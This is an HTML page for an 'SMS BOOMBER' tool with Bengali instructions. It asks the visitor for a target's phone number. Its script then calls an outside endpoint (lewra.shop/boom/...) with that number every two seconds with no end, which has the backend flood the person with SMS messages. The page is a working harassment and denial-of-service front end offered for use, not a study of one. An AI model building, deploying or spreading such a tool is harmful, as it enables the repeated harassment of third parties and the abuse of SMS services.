<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>𝗭𝗶𝗻𝘅𝗲𝘀𝟳𝘇</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: #0A0A11;
      height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #e2e8f0;
    }
    .box {
      background: #1E1E1E;
      width: 360px;
      border-radius: 16px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      padding: 30px 35px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
      text-align: center;
    }
    h2 {
      margin: 0 0 18px;
      text-align: center;
      font-size: 24px;
      letter-spacing: 0.5px;
      color: #f1f5f9;
    }
    .line {
      height: 4px;     
      background: #3b82f6;
      border-radius: 2px;
      margin: 10px auto 20px;
    }
    label {
      font-size: 1px;
      color: #cbd5e1;
      display: block;
      margin-bottom: 6px;
      font-weight: 500;
      text-align: left;
    }
    
    input {
      width: 100%;
      border: 1px solid #0081FF;
      border-radius: 10px;
      padding: 11px;
      margin-bottom: 8px;
      font-size: 15px;
      background: #040407;
      color: #f1f5f9;
      transition: border-color 0.2s, background 0.2s;
    }
    input:focus {
      border-color: #3b82f6;
      background: #1e293b;
      outline: none;
    }
    button {
      width: 100%;
      background: linear-gradient(to right, #3b82f6, #1d4ed8);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      letter-spacing: 0.3px;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: linear-gradient(to right, #F54949, #dc2626);
    }
    
    .msg {
      text-align: center;
      font-size: 14px;
      margin-top: 8px;
      font-weight: 500;
      
    }

    /* ✅ Premium Notice Box */
    .notice-box {
      background: #040407;    
      border-radius: 12px;
      padding: 12px 30px;
      font-weight: 600;
      margin: 20px 0;
      text-align: left;
      font-size: 16px;
      line-height: 1.5;
      color: #fff;
      border: 1px solid #ffffff;
    }

    .notice-box strong {
      color: #3b82f6;
      font-weight: 800;
    }

/* 🔴 Offline / Alert Status Box */
.status-box {
  margin-top: 28px;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 6px 12px;
  border-radius: 50px;
  background: rgba(255, 0, 0, 0.15);
  border: 1px solid #FF0000;
  color: #FF0000;
  font-weight: 600;
  font-size: 0.85rem;
  box-shadow: 0 0 10px rgba(255, 0, 0, 0.25);
}

.status-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #FF0000;
  box-shadow: 0 0 6px #FF0000;
  animation: blink 1.5s infinite;
}

@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.4; }
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(8px); }
  to { opacity: 1; transform: translateY(0); }
}
  </style>
</head>
<body>
  <div class="box">
    <h2>SMS BOOMBER</h2>
    <div class="line"></div>
    <form id="smsForm">
      
      <input type="text" id="phone" placeholder="01XXXXXXXXX" required>

      <!-- ✅ Premium Notice Box -->
      <div class="notice-box">
        যার Number এ SMS Bombing করতে চান তার Number টা উপরে দিয়ে Start Bomber Button এ Click করে একটু অপেক্ষা করুন !
      </div>

      <button type="submit">Start Bomber</button>
      <div class="msg" id="status"></div>
    </form>
  </div>

  <!-- ✅ Offline Status Box -->
  <div class="status-box">
    <span class="status-dot"></span> Offline
  </div>

  <script>
    const form = document.getElementById('smsForm');
    const status = document.getElementById('status');
    let intervalId;

    form.addEventListener('submit', e => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();

      if (!phone) {
        status.textContent = "Please fill the phone number.";
        status.style.color = "#f87171";
        return;
      }

      status.textContent = "Sending...";
      status.style.color = "#94a3b8";

      if (intervalId) clearInterval(intervalId);

      intervalId = setInterval(() => {
        const url = `https://lewra.shop/boom/fuck.php?phone=${phone}`;
        const img = new Image();
        img.src = url;
      }, 2000);

      const url = `https://lewra.shop/boom/fuck.php?phone=${phone}`;
      const img = new Image();
      img.src = url;

      status.textContent = "Bomber Message sending...";
      status.style.color = "#fff";
      
    });
  </script>
</body>
</html>
